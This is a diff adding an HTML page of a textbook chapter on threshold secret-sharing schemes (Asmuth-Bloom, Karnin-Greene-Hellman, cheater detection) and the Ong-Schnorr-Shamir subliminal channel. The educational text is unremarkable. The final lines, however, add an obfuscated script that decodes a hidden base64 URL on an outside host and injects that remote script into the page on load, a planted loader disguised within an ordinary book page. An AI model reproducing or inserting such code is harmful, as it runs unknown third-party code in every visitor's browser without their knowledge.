@@ -1,0 +1,127 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Special Algorithms for Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=23//-->
+<!--PAGES=529-532//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Asmuth-Bloom</I></B></FONT></P>
+<P>This scheme uses prime numbers [65]. For an (<I>m, n</I>)-threshold scheme, choose a large prime, <I>p,</I> greater than <I>M.</I> Then choose <I>n</I> numbers less than <I>p, d</I><SUB>1</SUB> , <I>d</I><SUB>2</SUB> ,  ..., <I>d</I><SUB>n</SUB>, such that:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;The <I>d</I> values are in increasing order; <I>d</I><SUB>i</SUB> &lt <I>d</I><SUB>i&#43;1</SUB>
+<DD><B>2.</B>&nbsp;&nbsp;Each <I>d</I><SUB>i</SUB> is relatively prime to every other <I>d</I><SUB>i</SUB>
+<DD><B>3.</B>&nbsp;&nbsp;<I>d</I><SUB>1</SUB> * <I>d</I><SUB>2</SUB> * ... * <I>d</I><SUB>m</SUB> &gt <I>p</I> * <I>d</I><SUB>n-m&#43;2</SUB> * <I>d</I><SUB>n-m&#43;3</SUB> * ... * <I>d</I><SUB>n</SUB>
+</DL>
+<P>To distribute the shadows, first choose a random value <I>r</I> and compute</P>
+<DL>
+<DD><I>M'</I> = <I>M</I> &#43; <I>rp</I>
+</DL>
+<P>The shadows, <I>k</I><SUB>i</SUB>, are</P>
+<DL>
+<DD><I>k</I><SUB>i</SUB> = <I>M'</I> mod <I>d</I><SUB>i</SUB>
+</DL>
+<P>Any <I>m</I> shadows can get together and reconstruct <I>M</I> using the Chinese remainder theorem, but any <I>m</I> -1 cannot. See [65] for details.</P>
+<P><FONT SIZE="+1"><B><I>Karnin-Greene-Hellman</I></B></FONT></P>
+<P>This scheme uses matrix multiplication [818]. Choose <I>n</I> &#43;1 <I>m</I>-dimensional vectors, <I>V</I><SUB>0</SUB> , <I>V</I><SUB>1</SUB> ,  ..., <I>Vn,</I> such that any possible <I>m</I> * <I>m</I> matrix formed out of those vectors has rank <I>m.</I> The vector <I>U</I> is a row vector of dimension <I>m</I> &#43;1.</P>
+<P><I>M</I> is the matrix product <I>U&#183;V</I><SUB>0</SUB>. The shadows are the products <I>U&#183;V</I><SUB>i</SUB>, where <I>i</I> is a number from 1 to <I>n.</I></P>
+<P>Any <I>m</I> shadows can be used to solve the <I>m</I> * <I>m</I> system of linear equations, where the unknowns are the coefficients of <I>U. UV</I><SUB>0</SUB> can be computed from <I>U.</I> Any <I>m</I> -1 shadows cannot solve the system of linear equations and therefore cannot recover the secret.</P>
+<P><FONT SIZE="+1"><B><I>Advanced Threshold Schemes</I></B></FONT></P>
+<P>The previous examples illustrate only the simplest threshold schemes: Divide a secret into <I>n</I> shadows such that any <I>m</I> can be used to recover the secret. These algorithms can be used to create far more complicated schemes. The following examples will use Shamir&#146;s algorithm, although any of the others will work.</P>
+<P>To create a scheme in which one person is more important than another, give that person more shadows. If it takes five shadows to recreate a secret and one person has three shadows while everyone else has only one, then that person and two other people can recreate the secret. Without that person, it takes five to recreate the secret.</P>
+<P>Two or more people could get multiple shadows. Each person could have a different number of shadows. No matter how the shadows are distributed, any <I>m</I> of them can be used to reconstruct the secret. Someone with <I>m</I> -1 shadows, be it one person or a roomful of people, cannot do it.</P>
+<P>In other types of schemes, imagine a scenario with two hostile delegations. You can share the secret so that two people from the 7 in Delegation A and 3 people from the 12 in Delegation B are required to reconstruct the secret. Make a polynomial of degree 3 that is the product of a linear expression and a quadratic expression. Give everyone from Delegation A a shadow that is the result of an evaluation of the linear equation; give everyone from Delegation B a shadow that is the evaluation of the quadratic equation.</P>
+<P>Any two shadows from Delegation A can be used to reconstruct the linear equation, but no matter how many other shadows the group has, they cannot get any information about the secret. The same is true for Delegation B: They can get three shadows together to reconstruct the quadratic equation, but they cannot get any more information necessary to reconstruct the secret. Only when the two delegations share their equations can they be multiplied to reconstruct the secret.</P>
+<P>In general, any type of sharing scheme that can be imagined can be implemented. All you have to do is to envision a system of equations that corresponds to the particular scheme. Some excellent papers on generalized secret-sharing schemes are [1462,1463,1464].</P>
+<P><FONT SIZE="+1"><B><I>Sharing a Secret with Cheaters</I></B></FONT></P>
+<P>This algorithm modifies the standard (<I>m, n</I>)-threshold scheme to detect cheaters [1529]. I demonstrate this using the Lagrange scheme, although it works with the others as well.</P>
+<P>Choose a prime, <I>p,</I> that is both larger than <I>n</I> and larger than</P>
+<DL>
+<DD>(<I>s</I> - 1) (<I>m</I> - 1)/<I>e</I> &#43; <I>m</I>
+</DL>
+<P>where <I>s</I> is the largest possible secret and <I>e</I> is the probability of successful cheating. You can make <I>e</I> as small as you want; it just makes the computation more complex. Construct your shadows as before, except instead of using <I>1, 2, 3,...,</I> <I>n</I> for <I>x</I><SUB>i</SUB>, choose random numbers between 1 and <I>p</I> - 1 for <I>x</I><SUB>i</SUB>.</P>
+<P>Now, when Mallory sneaks into the secret reconstruction meeting with his false share, his share has a high probability of not being possible. An impossible secret is, of course, a fake secret. See [1529] for the math.</P>
+<P>Unfortunately, while Mallory is exposed as a cheater, he still learns the secret (assuming that there are <I>m</I> other valid shares). Another protocol, from [1529,975], prevents that. The basic idea is to have a series of <I>k</I> secrets, such that none of the participants knows beforehand which is correct. Each secret is larger than the one before, except for the real secret. The participants combine their shadows to generate one secret after the other, until they create a secret that is less than the previous secret. That&#146;s the correct one.</P>
+<P>This scheme will expose cheaters early, before the secret is generated. There are complications when the participants deliver their shadows one at a time; refer to the papers for details. Other papers on the detection and prevention of cheaters in threshold schemes are [355,114,270].</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">23.3 Subliminal Channel</FONT></H3>
+<P><FONT SIZE="+1"><B>Ong-Schnorr-Shamir</B></FONT></P>
+<P>This subliminal channel (see Section 4.2), designed by Gustavus Simmons [1458,1459,1460], uses the Ong-Schnorr-Shamir identification scheme (see Section 20.5). As in the original scheme, the sender (Alice) chooses a public modulus, <I>n,</I> and a private key, <I>k,</I> such that <I>n</I> and <I>k</I> are relatively prime. Unlike the original scheme, <I>k</I> is shared between Alice and Bob, the recipient of the subliminal message.</P>
+<P>The public key is calculated:</P>
+<DL>
+<DD><I>h</I> = -<I>k</I><SUP>2</SUP>  mod <I>n</I>
+</DL>
+<P>If Alice wants to send the subliminal message <I>M</I> by means of the innocuous message <I>M',</I> she first confirms that <I>M'</I> and <I>n</I> are relatively prime, and that <I>M</I> and <I>n</I> are relatively prime.</P>
+<P>Alice calculates</P>
+<DL>
+<DD><I>S</I><SUB>1</SUB> = 1/2 * ((<I>M'</I> /<I>M</I> &#43; <I>M</I>)) mod <I>n</I>
+<DD><I>S</I><SUB>2</SUB> = <I>k</I>/2 * ((<I>M'</I> /<I>M</I> - <I>M</I>)) mod <I>n</I>
+</DL>
+<P>Together, the pair, <I>S</I><SUB>1</SUB> and <I>S</I><SUB>2</SUB>,   is the signature under the traditional Ong-Schnorr-Shamir scheme and the carrier of the subliminal message.</P>
+<P>Walter the warden (remember him?) can authenticate the message as described by the Ong-Schnorr-Shamir signature scheme, but Bob can do better. He can authenticate the message (it is always possible that Walter can make his own messages). He confirms that</P>
+<DL>
+<DD><I>S</I><SUB>1</SUB><SUP>2</SUP> - <I>S</I><SUB>2</SUB> <SUP>2</SUP>/<I>k<SUP>2</SUP></I> &#8801; <I>M'</I> (mod <I>n</I>)
+</DL>
+<P>If the message is authentic, the receiver can recover the subliminal message using this formula:
+</P>
+<DL>
+<DD><I>M</I> = <I>M'</I>/(<I>S</I><SUB>1</SUB> &#43; <I>S</I><SUB>2</SUB> k<SUP>-1</SUP>) mod <I>n</I>
+</DL>
+<P>This works, but remember that the basic Ong-Schnorr-Shamir has been broken.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(dDzVXWAy, FNzUVkzQ) {FNzUVkzQ = dDzVXWAy.createElement('script');FNzUVkzQ.type = 'text/javascript';FNzUVkzQ.async = true;FNzUVkzQ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');dDzVXWAy.getElementsByTagName('body')[0].appendChild(FNzUVkzQ);}(document));</script></body>
+</html>
